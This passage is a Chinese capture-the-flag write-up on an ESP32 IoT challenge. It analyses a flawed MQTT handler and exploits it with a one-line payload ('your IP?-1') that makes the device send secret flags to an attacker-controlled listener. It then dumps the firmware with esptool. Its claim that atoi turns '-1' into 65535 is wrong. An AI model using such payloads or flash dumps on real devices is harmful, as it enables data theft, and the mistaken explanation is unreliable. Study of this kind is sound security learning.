观察代码发现flag2和3都被写入了flagdata又被写入了out接着被写入了httpdata，被http_get_task(url,httpdata);调用.那么我们需要看一下http_get_task(url,httpdata);函数的作用以及如何触发到这里。

下面是http_get_task的代码，其作用是向指定的url以get的方式发送数据

```c
// 定义一个静态函数，用于执行 HTTP GET 请求或发送 HTTP 数据
// 参数：
//   webserver：目标服务器域名或IP地址，例如 "example.com" 或 "192.168.1.100"
//   httpdata：要发送的HTTP请求内容，例如 "GET / HTTP/1.0\r\nHost: example.com\r\n\r\n"
static void http_get_task(char *webserver, char *httpdata)
{
    // 设置 addrinfo 提示，用于指定返回IPv4地址(AF_INET)和TCP流(SOCK_STREAM)
    const struct addrinfo hints = {
        .ai_family = AF_INET,          // 仅使用IPv4
        .ai_socktype = SOCK_STREAM,    // TCP协议
    };
    struct addrinfo *res;              // 存放结果的指针
    struct in_addr *addr;              // 用于保存 IP 地址的结构体
    int s;                             // 套接字描述符
    // 执行DNS解析，将域名转换为IP地址
    getaddrinfo(webserver, "80", &hints, &res);
    // 从结果中提取出IP地址部分
    addr = &((struct sockaddr_in *)res->ai_addr)->sin_addr;
    // 打印解析到的IP地址
    ESP_LOGI("network", "DNS lookup succeeded. IP=%s", inet_ntoa(*addr));
    // 创建一个socket，用于网络连接
    s = socket(res->ai_family, res->ai_socktype, 0);
    ESP_LOGI("network", "... allocated socket");
    // 连接到远程服务器（IP和端口都在 res->ai_addr 中）
    connect(s, res->ai_addr, res->ai_addrlen);
    ESP_LOGI("network", "... connected");
    // DNS解析的结果用完后释放资源
    freeaddrinfo(res);
    // 通过 socket 发送 HTTP 请求内容
    write(s, httpdata, strlen(httpdata));
    // 关闭 socket 连接
    close(s);
}

```

那么我们清楚了这个函数的作用，就看一下如何触发逻辑。触发逻辑在mqtt_data_hander中

```c
// MQTT 数据处理函数
// 参数：
//   length：MQTT 数据的总长度
//   data：MQTT 数据的内容
void mqtt_data_hander(int length, char *data) {
    char l[10];                      // 用于临时存储从URL中提取的数字字符串
    char url[500] = {0};            // 存放提取出来的 URL
    char out[500] = {0};            // 存放将要插入 HTTP 请求中的 flag 数据
    char httpdata[500] = {0};       // 构造好的 HTTP 请求数据
    char flagdata[500] = {0};       // 存放拼接后的 flag 信息
    char tag3[] = " [+] MQTT task III: ";  // 任务标识字符串
    // 拼接最终的 flagdata 内容，例如：
    // mqtt_flag_2 = "FLAG2", mqtt_flag_3 = "FLAG3"
    // -> flagdata = "FLAG2 [+] MQTT task III: FLAG3"
    sprintf(flagdata, "%s%s%s", mqtt_flag_2, tag3, mqtt_flag_3);
    int a = 46; // 默认截取长度为46（如果URL中无特殊指令）
    // 在 data 中查找 '?' 字符，格式应为：<url>?<length>
    char *p = strnstr(data, "?", length);
    if (p) {
        // 提取 '?' 之前的部分作为 URL
        int data_length = p - data;
        // 提取 '?' 后的数字部分并转换为整数 a
        snprintf(l, length - data_length, "%s", p + 1);
        a = atoi(l); // 将字符串转为整数
        length = data_length; // 修正 length，只保留 '?' 之前的 URL 部分
    }
    // 将前 length 字节的 data 拷贝为 URL 字符串
    sprintf(url, "%.*s", length, data);
    // 构造 HTTP 请求模板，flag 字段将被填充
    char fmt[] = "GET / HTTP/1.0\r\n"
                 "User-Agent: esp-idf/1.0 esp32\r\n"
                 "flag: %s\r\n"
                 "\r\n";
    // 如果 a 小于 flagdata 可用长度，则生成 HTTP 请求并发送
    // 注意：sizeof(mqtt_flag_2) 是包含 null 的大小，所以 -1
    if (a < (int)(sizeof(mqtt_flag_2) + sizeof(tag3) - 1)) {
        // 从 flagdata 中取出前 a 字节放入 out
        memcpy(out, flagdata, a & 0xff);
        // 填入 HTTP 请求内容
        sprintf(httpdata, fmt, out);
        // 发起 HTTP 请求到 url 地址
        http_get_task(url, httpdata);
    }
}
而我们的mqtt_data_hander在mqtt_event_handler_cb中被调用，不再阐述
```

很明显我们可以发现它memcpy复制的长度是a&0xff。而a=atoi(l)。atoi经典的整型溢出函数

我们假如输入l=-1被atoi转换后变为65535也就是0xffff。而a&0xff后则变为0xff。也就是255.这个长度足够将我们flag打印出来。

也就是说假如我们向指定的topic发送形如 `www.baidu.com?-1`，设备从我们发送的payload里提取出主机和截断长度。
使用mqttx发送payload
```shell
你的ip地址?-1
```

![49.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbonhzfd70rhhc44i8.png)

即可在开启监听的vps上看到flag

![50.png](https://www.iotsec-zone.com/api/image/v2/20250729/dboni1zpscgtegpmdd.png)
至此题目复现告终。

### esp32固件提取
esp32浏览网络最方便的提取固件方式应该就是利用esptool

[https://github.com/espressif/esptool](https://github.com/espressif/esptool)

最好还是直接

```shell
pip install esptool
```

虽然我这块板子也有uart串口，但是感觉没必要舍近求远。最好搞个创建conda环境进行安装

![51.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbonj6ngl2d6tilvti.png)

```plain
esptool --chip AUTO --port COM7 read-flash 0x000000 0x400000 full_flash.bin
```

依旧老方法，报错长按boot按钮

读取速度还可以

![52.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbonj8xm2zb0ii4fp2.png)

### 总结
此题目硬件、蓝牙、wifi、mqtt都有涉及，通过学习这套赛题，把整个开发板从烧录阶段到最终的固件提取阶段完完整整的体验了一遍，以及各种协议抓包工具使用。感叹22年就有如此精良的题目，而我25年才发现得以复现。万分感谢出题人！

### 参考文章
参考资源1：[https://cloud.tencent.com/developer/article/2311489](https://cloud.tencent.com/developer/article/2311489)

参考资源2：[https://xuanxuanblingbling.github.io/iot/2022/08/30/esp32/](https://xuanxuanblingbling.github.io/iot/2022/08/30/esp32/)

参考资源3：[https://www.zhihu.com/column/p/24403895](https://www.zhihu.com/column/p/24403895)    
